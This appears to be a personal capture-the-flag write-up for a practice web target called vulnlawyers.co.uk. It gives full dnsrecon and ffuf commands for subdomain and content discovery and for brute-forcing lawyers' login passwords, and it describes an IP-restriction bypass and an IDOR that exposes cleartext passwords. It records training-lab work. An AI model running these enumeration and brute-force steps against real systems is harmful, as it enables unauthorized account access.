1. [x] Sudomain Discovery
	1. [x] `dnsrecon -d vulnlawyers.co.uk -D ~/wordlists/subdomains.txt -t brt`![[Pasted image 20220527050004.png]]
		- Found `data.vulnlawyers.co.uk` and `www.vulnlaywers.co.uk`
	2. [x] Searching on [crt.sh](https://crt.sh/?q=vulnlawyers.co.uk)
		- Nothing found.
	3. Accessing `data.vulnlawyers.co.uk` shows this![[Pasted image 20220527050805.png]] *Found Flag 1*
2. [x] Content discovery on [data.vulnlaywers.co.uk](http://data.vulnlawyers.co.uk)
	1.  `ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjRZM3A2TTNKMmR5SXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJhYmYwNzRmYWI0Yzk2YjA3OTM4ZDcxNGQ0N2VhZWIzNSJ9" -u http://data.vulnlawyers.co.uk/FUZZ -mc all -fc 404`![[Pasted image 20220527052754.png]]
	2. Visited [/users/](http://vulnlawyers.co.uk/users)and found some users' data![[Pasted image 20220527053245.png]] *Found Flag 3*. This means that maybe there is a mail server running? **No**
3. [x] Content discovery on [www.vulnlawyers.co.uk](http://www.vulnlaywers.co.uk)
	1. `ffuf -w ~/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjRZM3A2TTNKMmR5SXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJhYmYwNzRmYWI0Yzk2YjA3OTM4ZDcxNGQ0N2VhZWIzNSJ9" -u http://www.vulnlawyers.co.uk/FUZZ -mc all -fc 404`![[Pasted image 20220528031347.png]]
	2. Visited `/login` in the browser but it redirected me to `/denied` page that showed `Acess is denied from your IP address` error. ![[Pasted image 20220528031530.png]]
	3. Visited `/login` but through Burp proxy, and this showed.![[Pasted image 20220528031716.png]] *Found Flag 2*
	4. Visited `/laywers-only` through Burp that directed me to `/laywers-only-login` then BOOM! A login protal.![[Pasted image 20220528032147.png]]
4. But from the `data.vulnlawyers.co.uk/users` api we found, we have a list of emails that we can now bruteforce their passwords. Trying with the first user `ffuf -w ~/wordlists/passwords.txt -t 1 -p 0.1 -X POST -d "email=marsha.blankenship%40vulnlawyers.co.uk&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSjRZM3A2TTNKMmR5SXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJhYmYwNzRmYWI0Yzk2YjA3OTM4ZDcxNGQ0N2VhZWIzNSJ9" -u http://www.vulnlawyers.co.uk/lawyers-only-login -mc all -fc 401`. Tried all users until I found ![[Pasted image 20220528043012.png]]
5. Logged in with `jaskaran.lowe@vulnlaywers.co.uk` and `summer` as a username and a password respectively. Found this.![[Pasted image 20220528043334.png]]*Found Flag 4*.
6. Surfed the website to see what it does. Found a `/lawyers-only-profile/` page that when seeing its page source, found this URL.![[Pasted image 20220528044022.png]]
7. Visited `/laywers-only-profile-details/4` and found that it reveals the password of every user in cleartext and it is also an *IDOR* vuln.![[Pasted image 20220528044325.png]]
8. Tried some ids and found another flag on `/laywers-only-profile-details/2` ![[Pasted image 20220528044640.png]] *Found Flag 5*
9. It seems that user `shayne.cairns` is an admin because he can delete a case.![[Pasted image 20220528044841.png]]
10. Last flag showed after deleting the case with this admin account.![[Pasted image 20220528045154.png]]*Found Flag 6*